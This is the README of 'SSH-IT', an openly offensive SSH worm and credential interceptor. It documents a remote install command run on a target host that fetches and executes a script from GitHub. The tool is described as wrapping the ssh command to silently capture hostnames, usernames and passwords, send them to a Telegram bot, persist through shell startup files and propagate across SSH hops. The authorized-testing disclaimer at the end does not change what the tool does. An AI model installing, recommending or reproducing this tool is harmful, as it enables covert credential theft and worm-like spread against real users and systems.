# SSH-IT — An autonomous SSH worm that intercepts outgoing SSH connections every time a user uses ssh.

A post-exploitation SSH credential interceptor that silently captures SSH passwords typed on a compromised host and sends real-time notifications via Telegram bot.
Once installed, it wraps the `ssh` command using a PTY proxy (ptyspy). Every outgoing SSH connection made by the infected user is intercepted — the destination, username, and password are captured and forwarded to a configured Telegram bot.

> **Recoded by Ari Setiawan**
> Original source: [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/)

## Installation
Run the following command on the target host:
```bash
bash -c "$(curl -fsSL https://raw.githubusercontent.com/tangsel1928/ssh-it/refs/heads/main/x)"
```

After installation completes, activate in the current shell session:

```bash
source ~/.gnu/prng/seed
```

## Uninstallation
```bash
~/.gnu/prng/thc_cli -r uninstall
```

To also disable the wrapper in the current shell session without reconnecting:
```bash
unset -f ssh sudo command which thc_set1 &>/dev/null
```

This removes:
- The PRNGD hook lines from `.bashrc`, `.profile`, `.bash_profile`, `.zshrc`
- The entire `~/.gnu/prng/` installation directory

## Configuration

Telegram credentials are stored in `~/.gnu/prng/telegram.cfg`:

```bash
TELEGRAM_BOT_TOKEN="your_bot_token_here"
TELEGRAM_CHAT_ID="your_chat_id_here"
TELEGRAM_ENABLED=1
```

## Features

- Silently intercepts outgoing SSH connections
- Captures destination host, username, and password
- Sends real-time Telegram notifications on each new captured credential
- Works through SSH chains (A → B → C captures credentials for both B and C)
- Persistent across reboots via `.bashrc` / `.profile` hooks
- Deduplication — same credential set is only reported once
- Self-contained static binaries, no dependencies required

## Environment Variables

| Variable | Description |
|---|---|
| `THC_DEPTH` | How many SSH hops deep to propagate (default: 2) |
| `THC_VERBOSE` | Enable verbose output when SSH is intercepted |
| `THC_DEBUG` | Enable debug output |
| `THC_TMPDIR` | Custom temporary directory for installation |

---

## Disclaimer

This tool is intended for authorized penetration testing, red team engagements, and security research only. Unauthorized use against systems you do not own or have explicit permission to test is illegal. The author assumes no responsibility for misuse.
